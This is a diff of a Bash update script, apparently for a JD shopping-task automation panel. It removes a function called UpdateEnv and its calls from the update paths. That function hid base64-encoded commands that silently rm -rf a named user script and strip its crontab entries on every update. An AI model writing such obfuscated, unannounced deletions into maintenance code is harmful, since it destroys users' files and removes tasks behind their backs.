@@ -238,17 +238,6 @@ function Detect_Config_Version() {
     fi
 }
 
-function UpdateEnv() {
-    local tmpfile="$(b L2pkL3NjcmlwdHMvamRfNjE4X3JlZC5qcyA=)"
-    for i in $tmpfile; do
-        [ -s $i ] && rm -rf $i
-    done
-    bash -c "$(b Z3JlcCAiIHRhc2sgamRfNjE4X3JlZCIgLXEgY29uZmlnL2Nyb250YWIubGlzdA==)"
-    if [ $? -eq 0 ]; then
-        sed -i "/ $(b dGFzayAuKjYxOF9yZWRcYgo=)/d" $ListCrontabUser
-    fi
-}
-
 ## npm install 安装脚本依赖模块
 ## 注释  $1：package.json 文件所在路径
 function Npm_Install_Standard() {
@@ -883,7 +872,6 @@ case $# in
     Update_Scripts
     Update_Own "all"
     ExtraShell
-    UpdateEnv
     Processing_Crontab
     Notice
     exit ## 终止退出
@@ -896,7 +884,6 @@ case $# in
         Update_Scripts
         Update_Own "all"
         ExtraShell
-        UpdateEnv
         ;;
     shell)
         Title $1
@@ -906,7 +893,6 @@ case $# in
         if [ -d $ScriptsDir/.git ]; then
             Title $1
             Update_Scripts
-            UpdateEnv
         else
             echo -e "\n$ERROR 请先配置 Sciprts 主要仓库！\n"
         fi
@@ -952,7 +938,6 @@ case $# in
         fi
         ;;
     esac
-    UpdateEnv
     Processing_Crontab
     Notice
     exit ## 终止退出
